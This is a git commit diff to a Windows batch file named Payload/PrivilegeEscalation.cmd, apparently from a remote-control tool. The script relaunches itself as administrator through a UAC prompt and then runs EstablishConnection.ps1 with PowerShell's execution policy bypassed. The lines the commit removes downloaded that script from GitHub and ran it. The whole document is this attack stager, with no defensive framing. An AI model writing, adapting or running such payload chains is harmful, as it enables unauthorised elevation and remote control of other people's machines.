f2ec6d4d529cf5bf88cd0362bce561172e916fc4
ReylanTeo <109081015+ReylanTeo@users.noreply.github.com>
2023-11-02 12:47:51 +0800

    Working

--- Payload/PrivilegeEscalation.cmd
+++ Payload/PrivilegeEscalation.cmd
@@ -4,17 +4,18 @@
 
 :: If not admin, restart script as admin
 if %errorlevel% neq 0 (
-    echo Running script as administrator...
-    goto UACPrompt
+    powershell -command "Start-Process -FilePath '%0' -ArgumentList 'RunAs_Admin' -Verb RunAs"
+    exit /b
 )
 
 :: Continue running the script
-powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/d32a82143adcca323a8f82aa1bef1edab65af7da/Payload/EstablishConnection.ps1' -OutFile 'EstablishConnection.ps1'"
-PowerShell -ExecutionPolicy Bypass -File ".\EstablishConnection.ps1"
+if "%1"=="RunAs_Admin" (
+    :: Run PowerShell as admin and execute your code
+    PowerShell -ExecutionPolicy Bypass -File "%~dp0EstablishConnection.ps1"
+) else (
+    echo Running script as administrator...
+    powershell -command "Start-Process -FilePath '%0' -ArgumentList 'RunAs_Admin' -Verb RunAs"
+)
 
 :: Exit the script
 exit /b
-
-:UACPrompt
-    powershell -Command "Start-Process -FilePath '%0' -Verb RunAs"
-    exit /b
